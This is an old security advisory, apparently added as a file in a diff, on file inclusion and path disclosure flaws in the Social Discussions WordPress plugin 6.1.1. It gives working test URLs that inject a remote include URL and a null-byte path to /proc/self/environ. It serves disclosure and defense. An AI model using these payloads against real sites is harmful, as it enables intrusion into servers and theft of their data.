@@ -1,0 +1,91 @@
+[waraxe-2012-SA#093] - Multiple Vulnerabilities in Wordpress Social Discussions Plugin
+======================================================================================
+
+Author: Janek Vind "waraxe"
+Date: 17. October 2012
+Location: Estonia, Tartu
+Web: http://www.waraxe.us/advisory-93.html
+
+
+Description of vulnerable target:
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Enables Social Sharing of your blog posts to 30+ Social Networks. Plugin also
+enables you to Automatically Publish or Self Publish your Blog Posts to 25+ 
+Networks.
+
+http://wordpress.org/extend/plugins/social-discussions/
+
+Affected version: 6.1.1
+
+###############################################################################
+1. Remote File Inclusion in "social-discussions-networkpub_ajax.php"
+###############################################################################
+
+Reasons: Uninitialized variable "$HTTP_ENV_VARS"
+Attack vectors: User-supplied parameter "HTTP_ENV_VARS"
+Preconditions:
+ 1. register_globals=on
+ 2. register_long_arrays=off
+ 3. allow_url_include=on for RFI if PHP >= 5.2.0
+ 4. PHP must be < 5.3.4 for LFI null-byte attacks
+ 5. magic_quotes_gpc=off for LFI null-byte attacks
+ 
+ 
+Php script "social-discussions-networkpub_ajax.php" line 2:
+------------------------[ source code start ]----------------------------------
+if (!function_exists('add_action')){
+  @include_once($GLOBALS['HTTP_ENV_VARS']['DOCUMENT_ROOT'] . "/wp-config.php");
+------------------------[ source code end ]------------------------------------
+
+We can see, that script expects old-style array "HTTP_ENV_VARS" to be initialized
+and containing "DOCUMENT_ROOT" entry. But it appears, that if PHP directive
+"register_long_arrays=off", then "HTTP_ENV_VARS" is uninitialized and if in
+same time "register_globals=on", it is possible to fill that array with any
+value, leading to the RFI (Remote File Inclusion) vulnerability.
+
+
+Tests:
+
+http://localhost/wp342/wp-content/plugins/social-discussions/social-discussions-networkpub_ajax.php?HTTP_ENV_VARS[DOCUMENT_ROOT]=http://php.net/?
+
+http://localhost/wp342/wp-content/plugins/social-discussions/social-discussions-networkpub_ajax.php?HTTP_ENV_VARS[DOCUMENT_ROOT]=/proc/self/environ%00z
+
+
+###############################################################################
+2. Full Path Disclosure in multiple scripts
+###############################################################################
+
+Reasons: Direct request to php script triggers pathname leak in error message
+Preconditions: PHP directive display_errors=on
+Result: Information Exposure Through an Error Message
+
+Tests:
+
+http://localhost/wp342/wp-content/plugins/social-discussions/social-discussions-networkpub.php
+
+Fatal error: Call to undefined function __() in
+C:\apache_www\wp342\wp-content\plugins\social-discussions\social-discussions-networkpub.php on line 2
+
+http://localhost/wp342/wp-content/plugins/social-discussions/social-discussions.php
+
+Fatal error: Call to undefined function __() in
+C:\apache_www\wp342\wp-content\plugins\social-discussions\social-discussions-networkpub.php on line 2
+
+http://localhost/wp342/wp-content/plugins/social-discussions/social_discussions_service_names.php
+
+Fatal error: Call to undefined function __() in
+C:\apache_www\wp342\wp-content\plugins\social-discussions\social_discussions_service_names.php on line 3
+
+
+
+Contact:
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+come2waraxe@yahoo.com
+Janek Vind "waraxe"
+
+Waraxe forum:  http://www.waraxe.us/forums.html
+Personal homepage: http://www.janekvind.com/
+Random project: http://albumnow.com/
+---------------------------------- [ EOF ] ------------------------------------
